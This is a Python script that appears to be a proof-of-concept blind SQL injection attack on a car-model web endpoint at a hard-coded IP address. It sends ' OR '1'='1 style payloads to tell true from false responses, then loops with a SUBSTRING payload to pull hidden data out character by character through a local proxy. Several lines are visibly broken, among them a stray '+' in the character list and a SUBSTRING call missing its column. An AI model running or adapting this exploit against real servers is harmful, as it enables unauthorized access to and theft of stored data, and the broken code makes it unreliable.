import requests
from requests.utils import requote_uri
import string

url = "http://3.64.222.103:8081/cars/model/thisModelDoesnotExist"


# SELECT * FROM CARS WHERE MODEL = 'thisModelDoesnotExist<payload>' LIMIT 1
payload = "' OR '1'='1"  # true=200
resp = requests.get(requote_uri(url + payload))
print(f"Poc request returns {resp.status_code} for true query")
print(resp.text)

payload = "' OR '1'='2"  # false=404
resp = requests.get(requote_uri(url + payload))
print(f"Poc request returns {resp.status_code} for false query")

payload = "'"  # invalid syntax=500
resp = requests.get(requote_uri(url + payload))
print(f"Poc request returns {resp.status_code} for invalid syntax")

print()
chars = + string.ascii_lowercase + string.ascii_uppercase + string.digits + string.whitespace
for i in range(100):
    for x in string.printable:
        payload = f"' OR SUBSTRING(, {i}, 1) = '{x}"
        resp = requests.get(requote_uri(url + payload), proxies={"http": "127.0.0.1:8080"})
        if resp.status_code == 200:
            print(x, end='')
            continue
print()
